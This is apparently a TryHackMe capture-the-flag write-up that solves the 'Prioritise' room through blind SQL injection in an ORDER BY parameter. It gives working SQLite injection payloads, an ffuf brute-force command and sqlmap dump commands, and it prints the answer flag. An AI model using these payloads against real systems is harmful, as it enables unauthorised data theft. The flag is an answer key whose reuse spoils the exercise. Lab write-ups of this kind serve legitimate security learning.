# THM WriteUp - <a href="https://tryhackme.com/room/prioritise">Prioritise</a>
This is a writeup of one of the easy challenges from <a href="https://tryhackme.com">TryHackMe</a>. The lab focus on finding the flag using less common SQL injection attack.
## Manual Way
`/?order=` this field is vulnerable to conditional based SQL Injection (Blind SQLi)

#### First Attempt
```SQL

/?order=(CASE WHEN (1=1) THEN date ELSE json('a') END)

```
*This sql query (1=1) results in showing due date so i assume this is vulnerable since the payload work*
*changing (1=2) causes the error that i intentionally defined in the query.


#### Second Step (checking database in used):
```SQL

/?order=(CASE WHEN (SELECT sqlite_version) > 1 THEN date ELSE json('a') END)

```

#### Alternative way:
```SQL

/?order=(CASE WHEN (SELECT COUNT(*) FROM sqlite_master) > 1 THEN date ELSE json('a') END)

```
- *I check whether the database is sqlite or whatever.*
- *If i use other database version check query like `@@version`, it displays an error. I conclude that sqlite is used.*

#### Finding how many table exist in the schema:
```SQL

(CASE WHEN (SELECT COUNT(tbl_name) FROM sqlite_master WHERE type='table') = {number} THEN date ELSE json('a') END)

```
After enumerating, i found out that there are two tables.

Since there are two table, we will start finding both table names. But we need to first identify how many alphabets are consists in both tables:
```SQL

(CASE WHEN (SELECT LENGTH(tbl_name) FROM sqlite_master WHERE type='table' LIMIT 1) = 5 THEN date ELSE json('a') END)
-- First table has five characters. --

# second_table
(CASE WHEN (SELECT LENGTH(tbl_name) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1) = 4 THEN date ELSE json('a') END)
-- Second table has four characters. --
```

#### Finding the first table name letter by letter:
```SQL

(CASE WHEN (SELECT substr(tbl_name,1,1) FROM sqlite_master Where type='table' LIMIT 1) = 'a' THEN date ELSE json('a') END)

```
First table name = `todos`

#### Finding the second table name:
```SQL

(CASE WHEN (SELECT substr(tbl_name,1,1) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1) = 'v' THEN date ELSE json('a') END)

```
 Second table name = `flag`

We're focusing on getting the flag so prioritize the `flag` table.

#### Finding Column name:
```SQL

(CASE WHEN (SELECT length(name) FROM pragma_table_info('flag') LIMIT 1 OFFSET 0)=4 THEN date ELSE json('a') END)

```
column name length = 4

```SQL

(CASE WHEN (SELECT substr(name,1,1) FROM pragma_table_info('flag') LIMIT 1)='f' THEN date ELSE json('a') END)

```
column name = flag

#### Finding value of the flag column
```SQL

(CASE WHEN (SELECT LENGTH(flag) FROM flag LIMIT 1)>30 THEN date ELSE json('a') END)

```
length value of flag column = 38

brute force with `ffuf` to enumerate since burp is too slow
```SHELL
ffuf -u http://10.49.152.174/?order=(CASE%20WHEN%20(SELECT%20substr(flag,POS,1)%20FROM%20flag%20LIMIT%201%20OFFSET%200)=%27CHAR%27%20THEN%20date%20ELSE%20json(%27a%27)%20END) -w test.txt:CHAR -w num.txt:POS -mc 200
```
test.txt contains a-z , 0-9
num.txt contains 1-38 (38 position)
`-mc 200` filter only 200 status result


## Automated using `sqlmap`
```Shell

sqlmap -u "http://10.49.152.174/?order=done" --level=2 --risk=2 --dbms=sqlite --tables

sqlmap -u "http://10.49.152.174/?order=done" --level=2 --risk=2 --dbms=sqlite -T flag --columns

sqlmap -u "http://10.49.152.174/?order=done" --level=2 --risk=2 --dbms=sqlite -T flag -C flag --dump

```


## Flag
flag{65f2f8cfd53d59422f3d7cc62cc8fdcd}
